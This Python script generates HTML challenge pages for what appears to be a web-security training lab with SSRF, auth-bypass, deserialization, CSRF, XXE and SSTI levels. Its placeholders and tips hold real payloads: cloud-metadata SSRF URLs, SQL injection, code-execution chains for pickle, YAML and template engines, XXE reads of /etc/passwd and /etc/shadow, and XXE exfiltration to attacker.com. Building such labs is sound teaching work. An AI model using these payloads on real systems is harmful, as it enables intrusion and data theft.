#!/usr/bin/env python3
"""Generate ALL missing interactive challenge templates."""
import os

T = "templates"

def w(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w') as f:
        f.write(content)
    print(f"  OK {path}")

# ============================================================
# SSRF TEMPLATES
# ============================================================
SSRF = [
    (1, "Basic SSRF", "A web proxy service that fetches URLs on your behalf.", "Exploit SSRF to access internal resources.", "Enter URL to fetch:", "https://example.com", ["Try http://127.0.0.1", "Try http://0.0.0.0", "Try http://localhost"]),
    (2, "SSRF with Internal Network Scanning", "A network monitoring dashboard that checks service health by URL.", "Scan the internal network to discover running services.", "Service URL to check:", "http://internal-service:8080/health", ["Try http://192.168.1.1", "Try port scanning with different ports"]),
    (3, "Cloud Metadata SSRF", "An image processing service that loads images from URLs.", "Access the cloud metadata endpoint to retrieve instance credentials.", "Image URL:", "https://example.com/image.jpg", ["Try http://169.254.169.254/latest/meta-data/", "Try http://metadata.google.internal"]),
    (4, "Blind SSRF with DNS Exfiltration", "A webhook registration system that validates URLs by making requests.", "Use DNS exfiltration to confirm SSRF.", "Webhook URL:", "https://your-callback.example.com/webhook", ["Use a DNS log service like burpcollaborator.net", "Try http://YOURID.burpcollaborator.net"]),
    (5, "SSRF with Basic Filters", "A URL shortener that previews destination URLs before redirecting.", "Bypass the URL filter that blocks internal IPs.", "URL to preview:", "https://example.com", ["Try http://2130706433 (decimal)", "Try http://0x7f000001 (hex)"]),
    (6, "SSRF via File Upload", "An SVG image processor that fetches external resources referenced in SVG files.", "Upload an SVG that references an internal URL.", "SVG Content:", "<svg><image href='http://internal/secret'/></svg>", ["Use image tag with internal URL", "Try use tag with external SVG"]),
    (7, "SSRF in Webhooks", "A CI/CD pipeline that sends build notifications to webhook URLs.", "Configure a webhook that points to an internal service.", "Webhook URL:", "https://hooks.example.com/notify", ["Try http://localhost:8080/admin", "Try http://169.254.169.254/"]),
    (8, "SSRF with WAF Bypass", "A URL validation service with basic IP filtering.", "Bypass the WAF that blocks localhost and private IP ranges.", "URL to validate:", "https://example.com", ["Try http://127.1", "Try http://localtest.me", "Try http://127.0.0.1.nip.io"]),
    (9, "SSRF via XXE", "An XML document processor that resolves external entities.", "Use XXE to trigger SSRF through external entity resolution.", "XML Document:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal">]><root>&xxe;</root>', ["Use ENTITY with file:// protocol", "Chain with cloud metadata endpoint"]),
    (10, "SSRF with DNS Rebinding", "A DNS lookup tool that resolves and fetches URLs.", "Use DNS rebinding to bypass IP validation.", "Domain to resolve:", "example.com", ["Use a rebinding service like rebind.network", "Try http://1u.ms"]),
    (11, "SSRF in GraphQL", "A GraphQL API that fetches data from internal microservices.", "Use GraphQL introspection to discover and exploit SSRF.", "GraphQL Query:", '{ fetchUrl(url: "http://internal/api") }', ["Query __schema to find SSRF fields", "Try fetchUrl with internal URLs"]),
    (12, "SSRF via Redis Protocol", "A cache management tool that connects to Redis via URL.", "Use the gopher protocol to interact with Redis.", "Redis URL:", "redis://localhost:6379", ["Try gopher://127.0.0.1:6379/_INFO", "Try dict://127.0.0.1:6379/info"]),
    (13, "SSRF in WebSocket Upgrade", "A WebSocket proxy that connects to backend services.", "Exploit SSRF during WebSocket connection upgrades.", "WebSocket URL:", "ws://internal-service:8080/ws", ["Try ws://127.0.0.1:8080", "Try wss://localhost/admin"]),
    (14, "SSRF via SMTP Protocol", "An email preview service that connects to mail servers.", "Use SSRF to interact with internal SMTP servers.", "Mail Server URL:", "smtp://internal-mail:25", ["Try smtp://127.0.0.1:25", "Try gopher://127.0.0.1:25/_EHLO"]),
    (15, "SSRF in OAuth Callbacks", "An OAuth integration that validates redirect URIs.", "Exploit SSRF through OAuth redirect URI validation.", "Redirect URI:", "https://example.com/callback", ["Try http://127.0.0.1/callback", "Try http://localhost:3000/oauth"]),
    (16, "SSRF via LDAP Protocol", "A directory lookup tool that queries LDAP servers.", "Use SSRF to query internal LDAP directories.", "LDAP URL:", "ldap://internal-dc:389", ["Try ldap://127.0.0.1:389", "Try ldapi:///"]),
    (17, "SSRF in Container Metadata", "A container diagnostics tool that fetches metadata endpoints.", "Access Docker/Kubernetes metadata via SSRF.", "Metadata URL:", "http://169.254.169.254/latest/meta-data/", ["Try /latest/meta-data/iam/security-credentials/", "Try Kubernetes metadata endpoint"]),
    (18, "SSRF via FTP Protocol", "A file transfer preview service that connects to FTP servers.", "Exploit internal FTP services through SSRF.", "FTP URL:", "ftp://internal-ftp:21/pub", ["Try ftp://127.0.0.1:21", "Try gopher://127.0.0.1:21/_USER anonymous"]),
    (19, "SSRF in API Gateway", "An API gateway that routes requests to backend services.", "Exploit SSRF in API gateway configurations.", "Backend URL:", "http://backend-api:3000/users", ["Try http://127.0.0.1:8080/admin", "Try http://gateway.internal/config"]),
    (20, "SSRF via Time-based Attacks", "A URL response time analyzer.", "Use timing differences to confirm blind SSRF.", "URL to analyze:", "http://internal-service/api", ["Measure response time differences", "Try http://127.0.0.1/sleep?delay=5"]),
    (21, "SSRF in Microservices", "A service mesh dashboard that probes internal services.", "Exploit SSRF to pivot between microservices.", "Service URL:", "http://user-service:8080/health", ["Try http://auth-service:8080/admin", "Try http://db-service:5432"]),
    (22, "SSRF via Protocol Smuggling", "A multi-protocol proxy that supports gopher, dict, and file protocols.", "Use protocol smuggling for advanced SSRF.", "Protocol URL:", "gopher://localhost:6379/_INFO", ["Try gopher://127.0.0.1:6379/_CONFIG GET dir", "Try dict://127.0.0.1:11211/stats"]),
    (23, "SSRF in Serverless Functions", "A serverless function that fetches external data sources.", "Exploit SSRF in serverless computing environments.", "Data Source URL:", "https://api.example.com/data", ["Try cloud metadata endpoint", "Try serverless runtime API endpoint"]),
]

for level, title, scenario, mission, label, placeholder, tips in SSRF:
    tips_html = "".join(f"<li>{t}</li>" for t in tips)
    w(f"{T}/ssrf/ssrf_level{level}.html", f'''{{% extends 'base.html' %}}

{{% block title %}}SSRF Level {level}: {title} - R00tGlyph{{% endblock %}}

{{% block content %}}
<div class="container mt-4">
    <div class="row">
        <div class="col-lg-8">
            <div class="card mb-4">
                <div class="card-header bg-danger text-white">
                    <h4 class="mb-0"><i class="bi bi-globe2 me-2"></i>SSRF Level {level}: {title}</h4>
                </div>
                <div class="card-body">
                    <div class="alert alert-info"><i class="bi bi-info-circle me-2"></i><strong>Scenario:</strong> {scenario}</div>
                    <div class="mb-4"><h5><i class="bi bi-bullseye me-2"></i>Your Mission</h5><p>{mission}</p></div>
                    <form method="POST">
                        <div class="mb-3">
                            <label for="url" class="form-label">{label}</label>
                            <input type="text" class="form-control" id="url" name="url" placeholder="{placeholder}" value="{{{{ url_input or '' }}}}">
                        </div>
                        <button type="submit" class="btn btn-danger"><i class="bi bi-send me-1"></i>Send Request</button>
                    </form>
                    {{% if response_output %}}<div class="mt-4"><h6><i class="bi bi-terminal me-2"></i>Response:</h6><pre class="bg-dark text-success p-3 rounded"><code>{{{{ response_output }}}}</code></pre></div>{{% endif %}}
                    {{% if error_message %}}<div class="alert alert-danger mt-3">{{{{ error_message }}}}</div>{{% endif %}}
                </div>
            </div>
        </div>
        <div class="col-lg-4">
            <div class="card mb-3"><div class="card-header"><h5 class="mb-0"><i class="bi bi-lightbulb me-2"></i>Tips</h5></div><div class="card-body"><ul class="small text-muted mb-0">{tips_html}</ul></div></div>
        </div>
    </div>
</div>
{{% endblock %}}
''')

print("OK SSRF templates!")

# ============================================================
# AUTH TEMPLATES
# ============================================================
AUTH = [
    (1, "SQL Injection Auth Bypass", "A corporate intranet login portal with a vulnerable authentication system.", "Bypass the login form without knowing valid credentials using SQL injection.", "Username:", "admin' OR 1=1--", ["Try admin' OR 1=1--", "Try ' OR '1'='1"]),
    (2, "JWT Token Manipulation", "A microservices API gateway that uses JWT for authentication.", "Manipulate the JWT token to gain admin access.", "JWT Token:", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", ["Try changing alg to none", "Try changing role to admin"]),
    (3, "Session Fixation", "An online banking simulation that does not regenerate session IDs after login.", "Exploit session fixation to hijack another user session.", "Session ID:", "abc123def456", ["Set session ID before login", "Check if session persists after auth"]),
    (4, "OAuth Misconfiguration", "A third-party OAuth integration with insecure redirect URI validation.", "Exploit OAuth misconfiguration to gain unauthorized access.", "Redirect URI:", "https://example.com/callback", ["Try http://localhost/callback", "Try open redirect to attacker domain"]),
    (5, "MFA Bypass", "A multi-factor authentication system with implementation flaws.", "Bypass the MFA requirement to access the admin panel.", "MFA Code:", "123456", ["Try skipping the MFA step", "Try 000000 or 111111"]),
    (6, "API Key Enumeration", "An API with predictable key generation.", "Enumerate valid API keys to access restricted endpoints.", "API Key:", "ak_test_000001", ["Try sequential keys", "Check for patterns in key format"]),
    (7, "SAML Assertion Forgery", "A SAML-based SSO implementation that does not verify signatures.", "Forge a SAML assertion to authenticate as any user.", "SAML Assertion:", "<saml:Assertion>...</saml:Assertion>", ["Remove the signature", "Modify the NameID"]),
    (8, "Kerberos Golden Ticket", "A simulated Kerberos environment with weak key derivation.", "Forge a Kerberos golden ticket for domain admin access.", "Ticket Data:", "TGT_DATA_HERE", ["Try forging with KRBTGT hash", "Set admin in PAC"]),
    (9, "Password Reset Poisoning", "A password reset system with host header injection.", "Poison the password reset token to hijack admin account.", "Host Header:", "attacker.com", ["Try Host: attacker.com", "Check reset link destination"]),
    (10, "Auth Chain Bypass", "A complex authentication system with multiple layers.", "Chain multiple vulnerabilities to bypass the entire auth flow.", "Auth Payload:", "chain_attack_payload", ["Find weak points in each layer", "Combine JWT + session + OAuth"]),
]

for level, title, scenario, mission, label, placeholder, tips in AUTH:
    tips_html = "".join(f"<li>{t}</li>" for t in tips)
    w(f"{T}/auth/auth_level{level}.html", f'''{{% extends 'base.html' %}}

{{% block title %}}Auth Level {level}: {title} - R00tGlyph{{% endblock %}}

{{% block content %}}
<div class="container mt-4">
    <div class="row">
        <div class="col-lg-8">
            <div class="card mb-4">
                <div class="card-header bg-warning text-dark">
                    <h4 class="mb-0"><i class="bi bi-shield-lock me-2"></i>Auth Level {level}: {title}</h4>
                </div>
                <div class="card-body">
                    <div class="alert alert-info"><i class="bi bi-info-circle me-2"></i><strong>Scenario:</strong> {scenario}</div>
                    <div class="mb-4"><h5><i class="bi bi-bullseye me-2"></i>Your Mission</h5><p>{mission}</p></div>
                    <form method="POST">
                        <div class="mb-3">
                            <label for="payload" class="form-label">{label}</label>
                            <textarea class="form-control" id="payload" name="payload" rows="4" placeholder="{placeholder}">{{{{ payload_input or '' }}}}</textarea>
                        </div>
                        <button type="submit" class="btn btn-warning"><i class="bi bi-unlock me-1"></i>Attempt Bypass</button>
                    </form>
                    {{% if response_output %}}<div class="mt-4"><h6><i class="bi bi-terminal me-2"></i>Response:</h6><pre class="bg-dark text-success p-3 rounded"><code>{{{{ response_output }}}}</code></pre></div>{{% endif %}}
                    {{% if error_message %}}<div class="alert alert-danger mt-3">{{{{ error_message }}}}</div>{{% endif %}}
                </div>
            </div>
        </div>
        <div class="col-lg-4">
            <div class="card mb-3"><div class="card-header"><h5 class="mb-0"><i class="bi bi-lightbulb me-2"></i>Tips</h5></div><div class="card-body"><ul class="small text-muted mb-0">{tips_html}</ul></div></div>
        </div>
    </div>
</div>
{{% endblock %}}
''')

print("OK Auth templates!")

# ============================================================
# DESERIALIZATION TEMPLATES
# ============================================================
DESER = [
    (1, "Python Pickle Deserialization", "A session management system using pickled session data.", "Craft a malicious pickle payload to execute arbitrary code.", "Pickle Payload:", "import os\nos.system('whoami')", ["Use __reduce__ method", "Try cos\\nsystem\\n(S'whoami'\\ntR."]),
    (2, "PHP Object Injection", "A PHP CMS with object caching using unserialize().", "Exploit PHP object injection to achieve RCE.", "Serialized Object:", 'O:4:"User":2:{s:4:"name";s:5:"admin";}', ["Try O:4:User:1:{s:8:isAdmin;b:1;}", "Look for magic methods"]),
    (3, "Java Deserialization", "A legacy enterprise application server with Java serialization.", "Use gadget chains for Java deserialization RCE.", "Java Serialized Data:", "\\xac\\xed\\x00\\x05...", ["Try CommonsCollections gadget chain", "Use ysoserial to generate payload"]),
    (4, ".NET BinaryFormatter", "A Windows service with network communication using BinaryFormatter.", "Exploit .NET deserialization to gain code execution.", ".NET Payload:", "AAEAAAD/////AQAAAAAAAA...", ["Try System.Diagnostics.Process", "Use ObjectDataProvider gadget"]),
    (5, "Node.js Deserialization", "A real-time messaging application using node-serialize.", "Exploit deserialization vulnerability in Node.js.", "Serialized JSON:", '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\')}()"}', ["Use $$ND_FUNC$$ wrapper", "Try require child_process"]),
    (6, "Ruby YAML Deserialization", "A Ruby on Rails application with YAML parsing.", "Exploit YAML deserialization for RCE.", "YAML Payload:", "--- !ruby/object:Gem::Installer", ["Try !ruby/object:Gem::Package::TarReader", "Use Kernel#system"]),
    (7, "Python YAML Deserialization", "A configuration loader using unsafe YAML parsing.", "Exploit YAML custom constructors for code execution.", "YAML Config:", "!!python/object/apply:os.system ['whoami']", ["Use !!python/object/apply", "Try !!python/object/new:subprocess"]),
    (8, "SOAP Deserialization with XXE", "A SOAP web service that deserializes XML payloads.", "Chain XXE with SOAP deserialization for file read.", "SOAP Envelope:", "<soap:Envelope><soap:Body>...</soap:Body></soap:Envelope>", ["Inject ENTITY in SOAP body", "Try file:///etc/passwd"]),
    (9, "MessagePack Deserialization", "A high-performance API using MessagePack serialization.", "Exploit MessagePack deserialization flaws.", "MessagePack Data:", "\\x81\\xa4data\\xc0", ["Try type confusion attacks", "Manipulate type markers"]),
    (10, "Gadget Chain Polymorphism", "An advanced deserialization challenge with multiple gadget chains.", "Chain multiple gadget classes for polymorphic RCE.", "Complex Payload:", "chained_gadget_payload", ["Combine multiple gadget chains", "Try bypassing gadget filters"]),
]

for level, title, scenario, mission, label, placeholder, tips in DESER:
    tips_html = "".join(f"<li>{t}</li>" for t in tips)
    w(f"{T}/deserial/deserial_level{level}.html", f'''{{% extends 'base.html' %}}

{{% block title %}}Deserialization Level {level}: {title} - R00tGlyph{{% endblock %}}

{{% block content %}}
<div class="container mt-4">
    <div class="row">
        <div class="col-lg-8">
            <div class="card mb-4">
                <div class="card-header bg-info text-white">
                    <h4 class="mb-0"><i class="bi bi-box-seam me-2"></i>Deserialization Level {level}: {title}</h4>
                </div>
                <div class="card-body">
                    <div class="alert alert-info"><i class="bi bi-info-circle me-2"></i><strong>Scenario:</strong> {scenario}</div>
                    <div class="mb-4"><h5><i class="bi bi-bullseye me-2"></i>Your Mission</h5><p>{mission}</p></div>
                    <form method="POST">
                        <div class="mb-3">
                            <label for="payload" class="form-label">{label}</label>
                            <textarea class="form-control font-monospace" id="payload" name="payload" rows="5" placeholder="{placeholder}">{{{{ payload_input or '' }}}}</textarea>
                        </div>
                        <button type="submit" class="btn btn-info"><i class="bi bi-play-fill me-1"></i>Deserialize</button>
                    </form>
                    {{% if response_output %}}<div class="mt-4"><h6><i class="bi bi-terminal me-2"></i>Response:</h6><pre class="bg-dark text-success p-3 rounded"><code>{{{{ response_output }}}}</code></pre></div>{{% endif %}}
                    {{% if error_message %}}<div class="alert alert-danger mt-3">{{{{ error_message }}}}</div>{{% endif %}}
                </div>
            </div>
        </div>
        <div class="col-lg-4">
            <div class="card mb-3"><div class="card-header"><h5 class="mb-0"><i class="bi bi-lightbulb me-2"></i>Tips</h5></div><div class="card-body"><ul class="small text-muted mb-0">{tips_html}</ul></div></div>
        </div>
    </div>
</div>
{{% endblock %}}
''')

print("OK Deserialization templates!")

# ============================================================
# CSRF TEMPLATES (Levels 1-10)
# ============================================================
CSRF = [
    (1, "Basic Form CSRF", "An online banking transfer form without CSRF protection.", "Craft a malicious form that transfers money when the victim visits your page.", "Transfer Form HTML:", '<form action="/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="9999"></form>', ["Create a hidden form that auto-submits", "Use onload to auto-submit"]),
    (2, "GET-based CSRF", "An admin panel that performs state-changing operations via GET requests.", "Exploit the GET-based CSRF to perform unauthorized actions.", "GET Request URL:", "/admin/delete-user?id=5", ["Use img src to trigger", "Try iframe src"]),
    (3, "JSON CSRF", "An API endpoint that accepts JSON but lacks CSRF protection.", "Send a CSRF request with JSON content type.", "JSON Payload:", '{"action":"delete","target":"admin"}', ["Use Content-Type: text/plain", "Try fetch() with credentials: include"]),
    (4, "File Upload CSRF", "A document management system with file upload functionality.", "Upload a malicious file via CSRF.", "Upload Form HTML:", '<form action="/upload" method="POST" enctype="multipart/form-data">...</form>', ["Use multipart/form-data in auto-submitting form", "Try uploading a shell"]),
    (5, "CSRF with Weak Tokens", "A form with predictable CSRF tokens.", "Bypass the weak CSRF token implementation.", "CSRF Token:", "123456", ["Try sequential tokens", "Check if token is based on timestamp"]),
    (6, "Referrer-based Protection Bypass", "A system that validates the Referer header for CSRF protection.", "Bypass the referrer validation.", "Referer Header:", "https://trusted-site.com", ["Try empty Referer", "Try https://trusted-site.com.attacker.com"]),
    (7, "CSRF in AJAX Requests", "A single-page app making XMLHttpRequests without CSRF tokens.", "Exploit CSRF in AJAX/fetch API calls.", "AJAX Request:", 'fetch("/api/delete", {method:"POST",credentials:"include"})', ["Use fetch() with credentials", "Try XMLHttpRequest"]),
    (8, "SameSite Cookie Bypass", "A site using SameSite=Lax cookies that can be bypassed.", "Bypass SameSite cookie protection.", "Attack Vector:", "Top-level navigation with POST redirect", ["Use a tag with POST form", "Try location.href trick"]),
    (9, "CSRF with Custom Headers", "An API with custom header-based CSRF protection.", "Bypass custom header validation.", "Custom Header:", "X-CSRF-Token: predictable", ["Try missing header (preflight bypass)", "Try Content-Type: text/plain"]),
    (10, "Multi-step CSRF", "A multi-step workflow without CSRF tokens on each step.", "Exploit CSRF across a multi-step process.", "Step Data:", "step=2&action=confirm", ["Skip validation steps", "Submit final step directly"]),
]

for level, title, scenario, mission, label, placeholder, tips in CSRF:
    tips_html = "".join(f"<li>{t}</li>" for t in tips)
    w(f"{T}/csrf/csrf_level{level}.html", f'''{{% extends 'base.html' %}}

{{% block title %}}CSRF Level {level}: {title} - R00tGlyph{{% endblock %}}

{{% block content %}}
<div class="container mt-4">
    <div class="row">
        <div class="col-lg-8">
            <div class="card mb-4">
                <div class="card-header bg-secondary text-white">
                    <h4 class="mb-0"><i class="bi bi-arrow-left-right me-2"></i>CSRF Level {level}: {title}</h4>
                </div>
                <div class="card-body">
                    <div class="alert alert-info"><i class="bi bi-info-circle me-2"></i><strong>Scenario:</strong> {scenario}</div>
                    <div class="mb-4"><h5><i class="bi bi-bullseye me-2"></i>Your Mission</h5><p>{mission}</p></div>
                    <form method="POST">
                        <div class="mb-3">
                            <label for="payload" class="form-label">{label}</label>
                            <textarea class="form-control font-monospace" id="payload" name="payload" rows="5" placeholder="{placeholder}">{{{{ payload_input or '' }}}}</textarea>
                        </div>
                        <button type="submit" class="btn btn-secondary"><i class="bi bi-send me-1"></i>Send Request</button>
                    </form>
                    {{% if response_output %}}<div class="mt-4"><h6><i class="bi bi-terminal me-2"></i>Response:</h6><pre class="bg-dark text-success p-3 rounded"><code>{{{{ response_output }}}}</code></pre></div>{{% endif %}}
                    {{% if error_message %}}<div class="alert alert-danger mt-3">{{{{ error_message }}}}</div>{{% endif %}}
                </div>
            </div>
        </div>
        <div class="col-lg-4">
            <div class="card mb-3"><div class="card-header"><h5 class="mb-0"><i class="bi bi-lightbulb me-2"></i>Tips</h5></div><div class="card-body"><ul class="small text-muted mb-0">{tips_html}</ul></div></div>
        </div>
    </div>
</div>
{{% endblock %}}
''')

print("OK CSRF 1-10 templates!")

# ============================================================
# XXE TEMPLATES (Levels 1-9)
# ============================================================
XXE = [
    (1, "Basic XXE File Disclosure", "An XML document processor that parses user-submitted XML.", "Read /etc/passwd using XXE.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', ["Use ENTITY xxe SYSTEM file:///etc/passwd", "Reference with &xxe;"]),
    (2, "XXE with DOCTYPE Restrictions", "An XML parser with basic DOCTYPE restrictions.", "Bypass DOCTYPE restrictions to read files.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>', ["Try different entity names", "Use parameter entities"]),
    (3, "XXE SYSTEM Entity Exploitation", "An XML service using SYSTEM entities for external resources.", "Access forbidden files using SYSTEM entities.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', ["Try file:///etc/shadow", "Try file:///proc/self/environ"]),
    (4, "XXE Internal Network Scanning", "An XML processor that resolves external URLs.", "Scan internal network services using XXE.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:8080">]><root>&xxe;</root>', ["Try http://127.0.0.1:PORT", "Try internal IP ranges"]),
    (5, "XXE Data Exfiltration via HTTP", "An XML parser that makes HTTP requests for external entities.", "Exfiltrate file contents via HTTP to your server.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=file">]><root>&xxe;</root>', ["Send data to your server", "Use http://yourserver.com/?data=file"]),
    (6, "XXE with Parameter Entities", "An XML parser that supports parameter entities.", "Use parameter entities for advanced XXE attacks.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root></root>', ["Define entity in external DTD", "Use %ENTITY%"]),
    (7, "Blind XXE via Error Messages", "An XML parser that does not return entity values but shows errors.", "Extract data through error-based blind XXE.", "XML Input:", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/%file;">]><root>&xxe;</root>', ["Use error messages to leak data", "Try invalid file paths with data"]),
    (8, "XXE with CDATA Injection", "An XML parser with CDATA sections.", "Use CDATA sections to bypass XXE filters.", "XML Input:", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><![CDATA[&xxe;]]></root>', ["Wrap entity in CDATA", "Try nested CDATA"]),
    (9, "XXE via SVG File Upload", "An image processor that parses SVG files.", "Upload a malicious SVG with XXE payload.", "SVG Input:", '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', ["Use SVG DOCTYPE", "Try image href with file://"]),
]

for level, title, scenario, mission, label, placeholder, tips in XXE:
    tips_html = "".join(f"<li>{t}</li>" for t in tips)
    w(f"{T}/xxe/xxe_level{level}.html", f'''{{% extends 'base.html' %}}

{{% block title %}}XXE Level {level}: {title} - R00tGlyph{{% endblock %}}

{{% block content %}}
<div class="container mt-4">
    <div class="row">
        <div class="col-lg-8">
            <div class="card mb-4">
                <div class="card-header bg-dark text-white">
                    <h4 class="mb-0"><i class="bi bi-file-earmark-code me-2"></i>XXE Level {level}: {title}</h4>
                </div>
                <div class="card-body">
                    <div class="alert alert-info"><i class="bi bi-info-circle me-2"></i><strong>Scenario:</strong> {scenario}</div>
                    <div class="mb-4"><h5><i class="bi bi-bullseye me-2"></i>Your Mission</h5><p>{mission}</p></div>
                    <form method="POST">
                        <div class="mb-3">
                            <label for="payload" class="form-label">{label}</label>
                            <textarea class="form-control font-monospace" id="payload" name="payload" rows="6" placeholder="{placeholder}">{{{{ payload_input or '' }}}}</textarea>
                        </div>
                        <button type="submit" class="btn btn-dark"><i class="bi bi-play-fill me-1"></i>Parse XML</button>
                    </form>
                    {{% if response_output %}}<div class="mt-4"><h6><i class="bi bi-terminal me-2"></i>Response:</h6><pre class="bg-dark text-success p-3 rounded"><code>{{{{ response_output }}}}</code></pre></div>{{% endif %}}
                    {{% if error_message %}}<div class="alert alert-danger mt-3">{{{{ error_message }}}}</div>{{% endif %}}
                </div>
            </div>
        </div>
        <div class="col-lg-4">
            <div class="card mb-3"><div class="card-header"><h5 class="mb-0"><i class="bi bi-lightbulb me-2"></i>Tips</h5></div><div class="card-body"><ul class="small text-muted mb-0">{tips_html}</ul></div></div>
        </div>
    </div>
</div>
{{% endblock %}}
''')

print("OK XXE 1-9 templates!")

# ============================================================
# SSTI TEMPLATES (Levels 1-10)
# ============================================================
SSTI = [
    (1, "Basic Jinja2 Template Injection", "A greeting card generator that takes your name and creates a personalized message.", "Inject Jinja2 template syntax to read the application config.", "Your Name:", "{{config}}", ["Try 7*7 to test", "Try config"]),
    (2, "Twig Template Injection", "A PHP email template builder using Twig.", "Exploit Twig template injection to access sensitive data.", "Email Template:", "{{app.request.server.all|join(',')}}", ["Try dump(app)", "Try _self.env.registerUndefinedFilterCallback"]),
    (3, "Freemarker SSTI", "A Java document generation service using Freemarker.", "Exploit Freemarker template injection.", "Document Template:", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", ["Use #assign directive", "Try freemarker.template.utility.Execute"]),
    (4, "Velocity Template Injection", "A blog post preview generator using Apache Velocity.", "Exploit Velocity template injection for RCE.", "Blog Template:", "#set($x=\"\") $x.class.forName(\"java.lang.Runtime\")", ["Use #set() directive", "Try $class.forName"]),
    (5, "Pug/Jade SSTI", "A resume builder application using Pug templates.", "Exploit Pug template injection in the compilation process.", "Resume Template:", "- var x = global.process.mainModule.require('child_process').execSync('id')", ["Use - for JavaScript execution", "Try #{} interpolation"]),
    (6, "SSTI with Basic Filter", "A web analytics dashboard with filtered template rendering.", "Bypass basic SSTI filters.", "Input:", "{{7*7}}", ["Try encoding with hex", "Try string concatenation"]),
    (7, "SSTI in Error Messages", "A form validation system that shows custom error messages through templates.", "Trigger template injection through error messages.", "Error Message:", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", ["Inject in error template", "Try request.application.__globals__"]),
    (8, "SSTI with WAF", "An e-commerce product description generator with WAF protection.", "Bypass WAF to achieve SSTI.", "Product Description:", "{{''.__class__.__mro__[1].__subclasses__()}}", ["Try hex encoding for braces", "Use string concatenation"]),
    (9, "Blind SSTI", "A background job processor that logs template rendering without returning output.", "Confirm blind SSTI using time-based or out-of-band techniques.", "Template Input:", "{{7*7}}", ["Use DNS exfiltration", "Try config and check side effects"]),
    (10, "SSTI in Email Templates", "An automated email marketing system using Freemarker.", "Exploit SSTI in email template rendering.", "Email Body:", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}", ["Use #assign", "Try freemarker.template.utility.Execute"]),
]

for level, title, scenario, mission, label, placeholder, tips in SSTI:
    tips_html = "".join(f"<li>{t}</li>" for t in tips)
    w(f"{T}/ssti/ssti_level{level}.html", f'''{{% extends 'base.html' %}}

{{% block title %}}SSTI Level {level}: {title} - R00tGlyph{{% endblock %}}

{{% block content %}}
<div class="container mt-4">
    <div class="row">
        <div class="col-lg-8">
            <div class="card mb-4">
                <div class="card-header bg-primary text-white">
                    <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>SSTI Level {level}: {title}</h4>
                </div>
                <div class="card-body">
                    <div class="alert alert-info"><i class="bi bi-info-circle me-2"></i><strong>Scenario:</strong> {scenario}</div>
                    <div class="mb-4"><h5><i class="bi bi-bullseye me-2"></i>Your Mission</h5><p>{mission}</p></div>
                    <form method="POST">
                        <div class="mb-3">
                            <label for="payload" class="form-label">{label}</label>
                            <textarea class="form-control font-monospace" id="payload" name="payload" rows="4" placeholder="{placeholder}">{{{{ payload_input or '' }}}}</textarea>
                        </div>
                        <button type="submit" class="btn btn-primary"><i class="bi bi-play-fill me-1"></i>Render Template</button>
                    </form>
                    {{% if response_output %}}<div class="mt-4"><h6><i class="bi bi-terminal me-2"></i>Rendered Output:</h6><pre class="bg-dark text-success p-3 rounded"><code>{{{{ response_output }}}}</code></pre></div>{{% endif %}}
                    {{% if error_message %}}<div class="alert alert-danger mt-3">{{{{ error_message }}}}</div>{{% endif %}}
                </div>
            </div>
        </div>
        <div class="col-lg-4">
            <div class="card mb-3"><div class="card-header"><h5 class="mb-0"><i class="bi bi-lightbulb me-2"></i>Tips</h5></div><div class="card-body"><ul class="small text-muted mb-0">{tips_html}</ul></div></div>
        </div>
    </div>
</div>
{{% endblock %}}
''')

print("OK SSTI 1-10 templates!")

print("\nAll templates generated successfully!")
